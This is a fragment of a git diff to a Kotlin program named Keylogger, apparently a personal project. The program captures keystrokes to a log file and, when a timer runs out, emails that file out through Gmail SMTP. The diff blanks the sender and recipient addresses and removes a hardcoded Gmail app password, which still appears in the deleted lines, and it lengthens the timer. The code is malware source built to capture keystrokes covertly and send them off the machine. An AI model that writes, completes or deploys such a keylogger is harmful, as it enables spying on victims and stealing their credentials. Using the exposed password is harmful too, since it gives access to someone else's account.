@@ -39,9 +39,8 @@ class Keylogger : NativeKeyListener {
 }
 
 fun enviarArchivoPorCorreo(logFile: File) {
-    val correoDestino = "estenm2023@dominio.com"
-    val correoRemitente = "estenm2023@gmail.com"
-    val contraseñaCorreo = "tyor bfop bypm bjhi" // Contraseña de aplicación
+    val correoDestino = ""
+    val correoRemitente = ""
 
     val propiedades = Properties().apply {
         put("mail.smtp.host", "smtp.gmail.com")
@@ -97,7 +96,7 @@ fun main() {
 
         val timerThread = Thread {
             try {
-                Thread.sleep(10_000)
+                Thread.sleep(15_000)
                 println("Tiempo finalizado. Deteniendo el Keylogger...")
                 GlobalScreen.unregisterNativeHook()
                 enviarArchivoPorCorreo(File("keylogger_logs.txt"))
